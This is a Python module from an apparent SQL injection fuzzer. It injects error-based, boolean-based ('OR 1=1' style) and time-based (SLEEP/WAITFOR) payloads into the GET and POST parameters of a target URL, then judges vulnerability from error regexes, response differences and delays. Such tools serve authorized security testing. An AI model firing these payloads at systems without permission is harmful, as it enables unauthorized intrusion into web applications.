#!/usr/bin/env python3
"""
Test Runner module for the SQL Injection Fuzzer
"""

import time
import re


class TestRunner:
    def __init__(self, url_parser, request_handler, response_analyzer, post_data_handler=None, verbose=False):
        self.url_parser = url_parser
        self.request_handler = request_handler
        self.response_analyzer = response_analyzer
        self.post_data_handler = post_data_handler
        self.verbose = verbose
        self.vulnerabilities = []
        self.found_vulnerability = None

    def run_tests(self, target_info, payloads, method="GET", content_type=None, data=None):
        """
        Run SQL injection tests against a target

        Args:
            target_info (dict): Target information including URL and parameters
            payloads (dict): Dictionary of payloads by type
            method (str): HTTP method (GET or POST)
            content_type (str, optional): Content type for POST requests
            data (str, optional): POST data

        Returns:
            list: List of detected vulnerabilities
        """
        self.vulnerabilities = []
        self.found_vulnerability = None

        # Get parameters to test based on method
        parameters = {}
        if method.upper() == "GET":
            parameters = target_info['parameters']
        elif method.upper() == "POST" and self.post_data_handler and data:
            post_data_info = self.post_data_handler.parse_post_data(
                data, content_type)
            parameters = post_data_info['parameters']

        if not parameters:
            print(f"[!] No parameters found for {method} request")
            return self.vulnerabilities

        print(
            f"[*] Found {len(parameters)} parameter(s) to test with {method}")

        # For each parameter, test different injection types
        for param_name in parameters:
            # Stop if we already found a vulnerability
            if self.found_vulnerability:
                break

            print(f"\n[*] Testing parameter: {param_name}")

            # Run tests in order of likelihood and efficiency
            # First test error-based injections (fastest to detect)
            if self.test_error_based(param_name, payloads.get('error_based', []),
                                     target_info, method, content_type, data):
                continue

            # Then test boolean-based injections
            if self.test_boolean_based(param_name, payloads.get('boolean_based', []),
                                       target_info, method, content_type, data):
                continue

            # Finally test time-based injections (slowest)
            if self.test_time_based(param_name, payloads.get('time_based', []),
                                    target_info, method, content_type, data):
                continue

        return self.vulnerabilities

    def test_error_based(self, param_name, payloads, target_info, method="GET", content_type=None, data=None):
        """Test error-based SQL injection"""
        if not payloads:
            return False

        print(
            f"[*] Testing error-based injections for parameter '{param_name}'")

        for payload in payloads:
            if self.verbose:
                print(f"[*] Trying payload: {payload}")

            # Create test request based on method
            if method.upper() == "GET":
                # Create test URL with injected payload
                test_url = self.url_parser.inject_payload(
                    target_info['original_url'], param_name, payload)
                response = self.request_handler.send_request(test_url)
            else:  # POST
                test_url = target_info['original_url']
                # Inject payload into POST data
                if self.post_data_handler:
                    modified_data = self.post_data_handler.inject_payload_to_post_data(
                        data, param_name, payload, content_type)
                    response = self.request_handler.send_request(test_url, method="POST", data=modified_data,
                                                                 headers={"Content-Type": content_type} if content_type else None)
                else:
                    # Skip if we can't handle POST data
                    continue

            if not response:
                continue

            # Check for SQL errors using regex patterns
            is_vulnerable, details = self._detect_sql_errors(response.text)

            if is_vulnerable:
                vuln = {
                    'parameter': param_name,
                    'payload': payload,
                    'url': test_url,
                    'method': method,
                    'details': details,
                    'type': 'error-based'
                }

                if method.upper() == "POST":
                    vuln['content_type'] = content_type

                self.vulnerabilities.append(vuln)
                self.found_vulnerability = 'error-based'

                print(
                    f"\n[+] Error-based SQL injection found in parameter '{param_name}'")
                print(f"    Payload: {payload}")
                print(f"    URL: {test_url}")
                print(f"    Method: {method}")
                print(f"    Details: {details}")

                return True

        return False

    def test_boolean_based(self, param_name, payloads, target_info, method="GET", content_type=None, data=None):
        """Test boolean-based SQL injection"""
        print(
            f"[*] Testing boolean-based injections for parameter '{param_name}'")

        # Get baseline response
        if method.upper() == "GET":
            original_url = target_info['original_url']
            baseline_response = self.request_handler.send_request(original_url)
        else:  # POST
            original_url = target_info['original_url']
            baseline_response = self.request_handler.send_request(original_url, method="POST",
                                                                  data=data,
                                                                  headers={"Content-Type": content_type} if content_type else None)

        if not baseline_response:
            print("[!] Failed to get baseline response")
            return False

        # Create pairs of TRUE/FALSE conditions for testing
        payload_pairs = [
            ("' OR 1=1-- -", "' OR 1=0-- -"),
            ("\" OR 1=1-- -", "\" OR 1=0-- -"),
            ("' AND 1=1-- -", "' AND 1=0-- -"),
            ("\" AND 1=1-- -", "\" AND 1=0-- -"),
            (" OR 1=1-- ", " OR 1=0-- "),
            (" AND 1=1-- ", " AND 1=0-- ")
        ]

        for true_payload, false_payload in payload_pairs:
            if self.verbose:
                print(
                    f"[*] Testing boolean pair: {true_payload} / {false_payload}")

            # Test with TRUE condition
            if method.upper() == "GET":
                true_url = self.url_parser.inject_payload(
                    target_info['original_url'], param_name, true_payload)
                true_response = self.request_handler.send_request(true_url)

                false_url = self.url_parser.inject_payload(
                    target_info['original_url'], param_name, false_payload)
                false_response = self.request_handler.send_request(false_url)
            else:  # POST
                true_url = target_info['original_url']

                # Inject payloads into POST data
                if self.post_data_handler:
                    true_data = self.post_data_handler.inject_payload_to_post_data(
                        data, param_name, true_payload, content_type)
                    true_response = self.request_handler.send_request(true_url, method="POST", data=true_data,
                                                                      headers={"Content-Type": content_type} if content_type else None)

                    false_data = self.post_data_handler.inject_payload_to_post_data(
                        data, param_name, false_payload, content_type)
                    false_response = self.request_handler.send_request(true_url, method="POST", data=false_data,
                                                                       headers={"Content-Type": content_type} if content_type else None)
                else:
                    # Skip if we can't handle POST data
                    continue

            if not true_response or not false_response:
                continue

            # Compare responses
            is_vulnerable, details = self._detect_boolean_injection(
                baseline_response, true_response, false_response)

            if is_vulnerable:
                vuln = {
                    'parameter': param_name,
                    'payload': f"TRUE: {true_payload}, FALSE: {false_payload}",
                    'url': true_url,
                    'method': method,
                    'details': details,
                    'type': 'boolean-based'
                }

                if method.upper() == "POST":
                    vuln['content_type'] = content_type

                self.vulnerabilities.append(vuln)
                self.found_vulnerability = 'boolean-based'

                print(
                    f"\n[+] Boolean-based SQL injection found in parameter '{param_name}'")
                print(
                    f"    Payload pair: TRUE: {true_payload}, FALSE: {false_payload}")
                print(f"    URL: {true_url}")
                print(f"    Method: {method}")
                print(f"    Details: {details}")

                return True

        return False

    def test_time_based(self, param_name, payloads, target_info, method="GET", content_type=None, data=None):
        """Test time-based SQL injection"""
        if not payloads:
            return False

        print(
            f"[*] Testing time-based injections for parameter '{param_name}'")

        # First get baseline response time
        start_time = time.time()
        if method.upper() == "GET":
            baseline_response = self.request_handler.send_request(
                target_info['original_url'])
        else:  # POST
            baseline_response = self.request_handler.send_request(target_info['original_url'], method="POST",
                                                                  data=data,
                                                                  headers={"Content-Type": content_type} if content_type else None)
        baseline_time = time.time() - start_time

        if not baseline_response:
            print("[!] Failed to get baseline response")
            return False

        print(f"[*] Baseline response time: {baseline_time:.2f} seconds")

        # Filter for sleep-specific payloads
        sleep_payloads = [p for p in payloads if any(term in p.upper() for term in [
                                                     'SLEEP', 'BENCHMARK', 'WAITFOR'])]

        for payload in sleep_payloads:
            if self.verbose:
                print(f"[*] Trying time-based payload: {payload}")

            # Extract sleep time from payload (typically between 1-5 seconds)
            sleep_time = 2  # Default assumption
            match = re.search(r'SLEEP\((\d+)\)', payload.upper())
            if match:
                sleep_time = int(match.group(1))

            # Create test request based on method
            if method.upper() == "GET":
                test_url = self.url_parser.inject_payload(
                    target_info['original_url'], param_name, payload)

                # Measure response time
                start_time = time.time()
                response = self.request_handler.send_request(test_url)
                response_time = time.time() - start_time
            else:  # POST
                test_url = target_info['original_url']

                # Inject payload into POST data
                if self.post_data_handler:
                    modified_data = self.post_data_handler.inject_payload_to_post_data(
                        data, param_name, payload, content_type)

                    # Measure response time
                    start_time = time.time()
                    response = self.request_handler.send_request(test_url, method="POST", data=modified_data,
                                                                 headers={"Content-Type": content_type} if content_type else None)
                    response_time = time.time() - start_time
                else:
                    # Skip if we can't handle POST data
                    continue

            if not response:
                continue

            # Detect time-based injection
            is_vulnerable, details = self._detect_time_based_injection(
                baseline_time, response_time, sleep_time)

            if is_vulnerable:
                vuln = {
                    'parameter': param_name,
                    'payload': payload,
                    'url': test_url,
                    'method': method,
                    'details': details,
                    'type': 'time-based'
                }

                if method.upper() == "POST":
                    vuln['content_type'] = content_type

                self.vulnerabilities.append(vuln)
                self.found_vulnerability = 'time-based'

                print(
                    f"\n[+] Time-based SQL injection found in parameter '{param_name}'")
                print(f"    Payload: {payload}")
                print(f"    URL: {test_url}")
                print(f"    Method: {method}")
                print(f"    Details: {details}")
                print(
                    f"    Time comparison: Baseline: {baseline_time:.2f}s, Injected: {response_time:.2f}s")

                return True

        return False

    def _detect_sql_errors(self, response_text):
        """
        Enhanced detection of SQL errors using regex patterns
        """
        # MySQL error patterns
        mysql_error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"MySQL Query fail.*",
            r"SQL syntax.*MariaDB server",
            r"Unknown column '[^']+' in 'field list'",
            r"com\.mysql\.jdbc\.exceptions",
            r"Unclosed quotation mark after the character string",
            r"Syntax error or access violation:",
            r"mysql_fetch_array\(\)",
            r"YOU HAVE AN ERROR IN YOUR SQL SYNTAX",
            r"DATABASE\.MYSQL\.DRIVER",
            r"supplied argument is not a valid MySQL",
            r"javax\.el\.ELException: The identifier \[mysql\]"
        ]

        # Generic database error patterns
        generic_error_patterns = [
            r"DB Error",
            r"SQL Error",
            r"SQL syntax.*",
            r"Warning.*SQL.*",
            r"Warning.*syntax.*",
            r"Warning.*for user '.*'",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Microsoft OLE DB Provider for SQL Server error",
            r"ODBC.*Driver",
            r"Error.*\bODBC\b.*Driver",
            r"Exception.*java\.sql\.SQLException",
            r"Unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"Syntax error.*in query expression",
            r"Data type mismatch"
        ]

        # Check MySQL specific errors
        for pattern in mysql_error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, f"MySQL error detected: {match.group(0)}"

        # Check generic SQL errors
        for pattern in generic_error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, f"SQL error detected: {match.group(0)}"

        return False, ""

    def _detect_boolean_injection(self, baseline_response, true_response, false_response):
        """
        Modern detection for boolean-based injections by comparing responses
        """
        baseline_content = baseline_response.text
        true_content = true_response.text
        false_content = false_response.text

        # Check for significant differences in response length
        baseline_length = len(baseline_content)
        true_length = len(true_content)
        false_length = len(false_content)

        # Significant difference between TRUE and FALSE conditions
        if abs(true_length - false_length) > 30:
            # For a successful boolean injection:
            # TRUE condition often resembles baseline (legitimate request)
            # FALSE condition often differs significantly

            # Check if TRUE response is similar to baseline and FALSE is different
            if abs(true_length - baseline_length) < abs(false_length - baseline_length):
                return True, f"Different response lengths: TRUE={true_length}, FALSE={false_length}, BASELINE={baseline_length}"

        # Check for key differences in content
        # Boolean injections often hide records in FALSE responses
        # Look for presence/absence of content indicators

        # Check for common content indicators (e.g., table data, records)
        content_indicators = [
            r"<tr[^>]*>.*?</tr>",
            r"<td[^>]*>.*?</td>",
            r"<div[^>]*>(.*?)</div>",
            r"<li[^>]*>.*?</li>",
            r"record",
            r"result"
        ]

        for indicator in content_indicators:
            true_matches = len(re.findall(
                indicator, true_content, re.IGNORECASE))
            false_matches = len(re.findall(
                indicator, false_content, re.IGNORECASE))

            # If TRUE condition has significantly more matches
            if true_matches > 0 and false_matches == 0:
                return True, f"Content indicators found in TRUE response but not in FALSE: {indicator}"

        # Check for significant differences in HTTP status codes
        if true_response.status_code != false_response.status_code:
            if true_response.status_code == 200 and false_response.status_code != 200:
                return True, f"Different HTTP status codes: TRUE={true_response.status_code}, FALSE={false_response.status_code}"

        return False, ""

    def _detect_time_based_injection(self, baseline_time, response_time, expected_delay):
        """
        Modern detection for time-based injections
        """
        # Calculate the time difference
        time_diff = response_time - baseline_time

        # For time-based injection to be valid:
        # 1. Response time should be noticeably longer than baseline
        # 2. Response time should be close to the expected delay

        # Check if time difference is significant
        time_threshold = expected_delay * 0.8  # 80% of expected delay as threshold

        if time_diff >= time_threshold:
            # Further validation - avoid false positives from network delays
            # If time delay is within expected range (not too high above expected delay)
            if time_diff <= (expected_delay * 1.5):
                confidence = "high"
            else:
                confidence = "medium"

            return True, f"Response delayed by {time_diff:.2f}s (expected: {expected_delay}s) - {confidence} confidence"

        return False, ""
